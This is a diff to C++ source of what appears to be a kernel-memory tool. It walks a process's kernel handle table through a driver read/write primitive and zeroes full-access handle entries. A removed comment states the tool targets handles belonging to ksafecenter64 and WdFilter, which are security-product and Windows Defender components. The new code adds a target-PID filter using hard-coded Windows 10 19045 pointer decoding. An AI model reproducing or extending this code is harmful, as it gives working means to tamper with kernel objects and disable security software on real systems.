@@ -191,42 +191,74 @@ void CmdHandleClose(DWORD pid, DWORD64 handleVal) {
     }
 }
 
-// ─── /handle-scan <pid> [--access <mask>] [--close] ──────────────────────────
+// ─── /handle-scan <pid> [--access <mask>] [--target-pid <pid>] [--close] ──────
 // Walk <pid>'s kernel HANDLE_TABLE and list every entry whose GrantedAccess
 // matches <mask> (default: PROCESS_ALL_ACCESS = 0x1fffff).
+//
+// --target-pid <t>  : only match entries pointing to process <t>'s EPROCESS.
+//   ObjectPointer encoding in Win10 19045 HANDLE_TABLE_ENTRY.VolatileLowValue:
+//     OBJECT_HEADER = (raw >> 16) | 0xFFFF000000000000
+//     EPROCESS      = OBJECT_HEADER + 0x30
+//   Verified from live scan: System h=0x4 raw=0xC98326AA7010FE9F,
+//   System EPROCESS=0xFFFFC98326AA7040, OBJECT_HEADER=0xFFFFC98326AA7010 ✓
+//
 // --close : zero each matching entry (same mechanics as /handle-close).
 //
-// Designed for pid=4 (System) to enumerate ksafecenter64 / WdFilter handles
-// that are invisible to NtQuerySystemInformation (OBJ_KERNEL_HANDLE).
-void CmdHandleScan(DWORD pid, DWORD64 accessMask, bool doClose) {
+// Safe usage: always pair --close with --target-pid to avoid closing
+// legitimate System handles to csrss/lsass/etc.
+void CmdHandleScan(DWORD pid, DWORD64 accessMask, DWORD targetPid, bool doClose) {
     if (!accessMask) accessMask = 0x001FFFFF;  // PROCESS_ALL_ACCESS
 
     DWORD64 ep = KUtil::FindEPROCESS(pid);
     if (!ep) { printf("%s[!]%s EPROCESS for PID %u not found.\n", A_RED, A_RESET, pid); return; }
     printf("%s[*]%s PID %-6u  EPROCESS=0x%llX\n", A_CYAN, A_RESET, pid, ep);
 
+    // Optional: resolve target PID's OBJECT_HEADER for precise filtering
+    DWORD64 targetObjHdr = 0;
+    if (targetPid) {
+        DWORD64 targetEP = KUtil::FindEPROCESS(targetPid);
+        if (!targetEP) {
+            printf("%s[!]%s --target-pid %u: EPROCESS not found.\n", A_RED, A_RESET, targetPid);
+            return;
+        }
+        targetObjHdr = targetEP - 0x30;  // OBJECT_HEADER is 0x30 bytes before body
+        printf("%s[*]%s target PID %-6u  EPROCESS=0x%llX  OBJECT_HEADER=0x%llX\n",
+               A_CYAN, A_RESET, targetPid, targetEP, targetObjHdr);
+    }
+
     DWORD64 ht = g_drv->Rd64(ep + KUtil::EP_HandleTable);
     if (!ht) { printf("%s[!]%s HandleTable ptr is null.\n", A_RED, A_RESET); return; }
 
     DWORD64 tableCode = g_drv->Rd64(ht + HT_TableCode);
-    printf("%s[*]%s HandleTable=0x%llX  TableCode=0x%llX (level=%llu)  filter=0x%llX%s\n",
+    printf("%s[*]%s HandleTable=0x%llX  TableCode=0x%llX (level=%llu)  "
+           "access=0x%llX%s%s\n",
            A_CYAN, A_RESET, ht, tableCode, (unsigned long long)(tableCode & 3),
-           accessMask, doClose ? "  [--close]" : "");
+           accessMask,
+           targetPid ? "  [--target-pid filtered]" : "  [all processes]",
+           doClose   ? "  [--close]" : "");
 
     struct ScanCtx {
         DWORD64 mask;
+        DWORD64 targetObjHdr;  // 0 = no filter
         bool    doClose;
         int     found;
         int     closed;
-    } ctx = { accessMask, doClose, 0, 0 };
+    } ctx = { accessMask, targetObjHdr, doClose, 0, 0 };
 
     WalkHandleTable(ht, [](DWORD64 entryVA, DWORD idx, DWORD64 obj, DWORD64 acc, void* pctx) -> bool {
         auto* c = (ScanCtx*)pctx;
-        // GrantedAccessBits are in bits 0..24 of the HighValue (acc).
-        // Compare against the requested mask.
-        if ((acc & c->mask) != c->mask) return true;  // not a match, continue
 
-        DWORD  hval = idx * 4;
+        // Access mask filter
+        if ((acc & c->mask) != c->mask) return true;
+
+        // Target-PID filter: decode ObjectPointer and compare to target OBJECT_HEADER
+        // Win10 19045 encoding: OBJECT_HEADER = (raw >> 16) | 0xFFFF000000000000
+        if (c->targetObjHdr) {
+            DWORD64 decoded = (obj >> 16) | 0xFFFF000000000000ULL;
+            if (decoded != c->targetObjHdr) return true;
+        }
+
+        DWORD hval = idx * 4;
         c->found++;
         printf("  %s[+]%s h=0x%08X  acc=0x%08llX  obj=0x%llX\n",
                A_GREEN, A_RESET, hval, acc, obj);
@@ -243,7 +275,7 @@ void CmdHandleScan(DWORD pid, DWORD64 accessMask, bool doClose) {
                        A_RED, A_RESET, hval, verify);
             }
         }
-        return true;  // continue walking
+        return true;
     }, &ctx);
 
     printf("\n%s[*]%s Scan complete — %d match(es) found",
